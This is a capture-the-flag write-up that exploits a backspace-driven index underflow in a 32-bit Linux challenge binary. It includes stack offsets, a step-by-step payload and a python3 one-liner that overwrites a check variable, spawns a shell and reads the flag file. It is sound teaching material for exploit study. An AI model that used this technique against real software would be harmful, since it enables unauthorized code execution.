## 1. Binary Specifications & Environmental Audit
An initial defensive assessment of the target environment was conducted to analyze active binary protections.

### Mitigation Check:
* **Architecture:** ELF 32-bit LSB executable (x86).
* **NX (No-Execute):** `NX enabled`. The Stack segment is non-executable, preventing raw shellcode execution.
* **ASLR (Address Space Layout Randomization):** `Disabled`. Stack, Heap, and Library base addresses remain static across runs.
* **SSP (Stack Smashing Protection):** `Disabled`. No stack canary is monitoring intermediate frame boundaries.

---

## 2. Static Analysis & Vulnerability Identification
The application controls user inputs character-by-character within a loop using a low-level, unbuffered `read()` system call:

```c
read(fileno(stdin), &i, 1);
switch(i)
{
    case 0x08:
      count--;
      printf("\b");
      break;
    ...
    default:
      buffer[count] = i;
      count++;
      break;
}
```

### Vulnerability Mechanics:
1. **Unbounded Underflow Vector:** When the application parses the control character `0x08` (Backspace), it decrements the `count` index variable without asserting a lower-bound constraint (e.g., verifying `count >= 0`). 
2. **Negative Indexing (Arbitrary Relative Write):** Supplying `0x08` while `count` is `0` pushes the index into a negative range (`-1`). This permits an operator to bypass forward array limits and write data directly into higher stack spaces (lower memory addresses) preceding the `buffer` array.

---

## 3. Offset Mapping & Stack Cartography
To locate the absolute layout of the local stack frame variables relative to the Base Pointer (`ebp`), the binary was cross-examined using GDB-GEF:

```text
0x08048652 <+92>:    cmp    DWORD PTR [ebp-0x54],0x3f    ; count tracking
0x0804866a <+116>:   cmp    DWORD PTR [ebp-0x50],0xbffffabc ; target check variable
0x08048711 <+283>:   lea    edx,[ebp-0x4c]               ; buffer base reference
```

### Memory Layout Analysis:
* **`count`** location: `ebp - 0x54`
* **`check`** location: `ebp - 0x50`
* **`buffer`** location: `ebp - 0x4c`

The structure indicates that the target integer variable `check` resides precisely 4 bytes before the start of `buffer`. There is no compiler padding present. Therefore:
* `buffer[-1]` maps to the highest byte of `check`.
* `buffer[-4]` maps to the lowest byte of `check`.

---

## 4. Exploit Payload Design & State Tracking
Because every standard byte allocation inside the `default:` case triggers a post-increment operation (`count++`), the tracking index shifts dynamic positions throughout execution. The state sequence must be carefully aligned to ensure bytes land inside the proper memory cells:

1. Send `\x08` $\rightarrow$ `count` drops to `-1`. 
2. Send `\xbf` $\rightarrow$ Writes to `buffer[-1]`. `count` increments back to `0`.
3. Send `\x08` * 2 $\rightarrow$ `count` drops down to `-2`.
4. Send `\xff` $\rightarrow$ Writes to `buffer[-2]`. `count` increments back to `-1`.
5. Send `\x08` * 2 $\rightarrow$ `count` drops down to `-3`.
6. Send `\xfa` $\rightarrow$ Writes to `buffer[-3]`. `count` increments back to `-2`.
7. Send `\x08` * 2 $\rightarrow$ `count` drops down to `-4`.
8. Send `\xbc` $\rightarrow$ Writes to `buffer[-4]`. `count` increments back to `-3`.

Due to x86 Little-Endian architecture, the final execution value structured into the memory space of `check` resolves perfectly to `0xbffffabc`.

---

## 5. Execution & Shell Interception
The precise byte-array payload was constructed using Python and piped natively with an active descriptor loop (`cat`) to claim an interactive local bash shell interface:

```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'\x08' + b'\xbf' + b'\x08'*2 + b'\xff' + b'\x08'*2 + b'\xfa' + b'\x08'*2 + b'\xbc')"; cat) | ./ch16
```

### Exploitation Output:
"""text
Enter your name: id
uid=1216(app-systeme-ch16-cracked) gid=1116(app-systeme-ch16) groups=1116(app-systeme-ch16),100(users)
cat ./.passwd              
REDACTED
"""
